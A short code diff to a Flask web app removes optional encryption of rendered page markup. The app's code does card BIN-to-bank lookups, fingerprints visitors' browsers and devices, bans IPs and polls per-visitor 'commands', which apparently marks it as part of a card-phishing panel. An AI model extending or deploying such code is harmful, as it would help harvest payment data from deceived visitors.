@@ -6,10 +6,10 @@ from datetime import datetime
 from flask import Blueprint, redirect, render_template, request, session, url_for
 
 from ..binlookup import lookup_bank
-from ..config import AppConfig
+
 from ..database import get_cursor
 from ..detectors import detect_browser, detect_device
-from ..encryption import build_encrypted_response
+
 from ..utils import enforce_ban, get_client_ip, tum_bosluklari_temizle, update_flow_state
 
 public_bp = Blueprint("public", __name__)
@@ -43,9 +43,6 @@ def _render(template_name: str, *, encrypt: bool | None = None, **context):
     client_ip = context.setdefault("client_ip", get_client_ip(request))
     context.setdefault("poll_url", url_for("commands.poll_data", ip=client_ip) if client_ip else url_for("commands.poll_data"))
     markup = render_template(template_name, **context)
-    should_encrypt = AppConfig.frontend_encryption_enabled if encrypt is None else encrypt
-    if should_encrypt:
-        return build_encrypted_response(markup)
     return markup
 
 
